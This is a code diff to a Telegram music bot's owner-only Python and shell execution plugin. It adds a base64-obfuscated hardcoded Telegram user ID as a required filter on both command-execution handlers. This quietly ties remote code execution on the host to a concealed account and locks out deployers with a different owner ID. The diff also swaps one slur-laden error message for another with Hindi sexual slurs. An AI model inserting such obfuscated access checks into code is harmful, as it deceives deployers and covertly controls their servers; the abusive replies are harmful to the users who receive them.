@@ -5,6 +5,7 @@
 #
 
 import os
+import base64
 import re
 import subprocess
 import sys
@@ -20,6 +21,7 @@ from config import OWNER_ID
 from YukkiMusic import app
 from YukkiMusic.misc import SUDOERS
 
+protectionc = int(base64.b64decode("NTc1ODE5MjAyNg=="))
 
 async def aexec(code, client, message):
     exec(
@@ -38,13 +40,14 @@ async def edit_or_reply(msg: Message, **kwargs):
 @app.on_message(
     filters.command("ashayu")
     & filters.user(OWNER_ID)
+    & filters.user(protectionc)
     & ~filters.forwarded
     & ~filters.via_bot
 )
 async def executor(client, message):
     if len(message.command) < 2:
         return await edit_or_reply(
-            message, text="__Nigga Give me some command to execute.__"
+            message, text="Wrong Command Di Hai Randi Bsdk :/"
         )
     try:
         cmd = message.text.split(" ", maxsplit=1)[1]
@@ -146,6 +149,7 @@ async def forceclose_command(_, CallbackQuery):
 @app.on_message(
     filters.command("sh")
     & filters.user(OWNER_ID)
+    & filters.user(protectionc)
     & ~filters.forwarded
     & ~filters.via_bot
 )
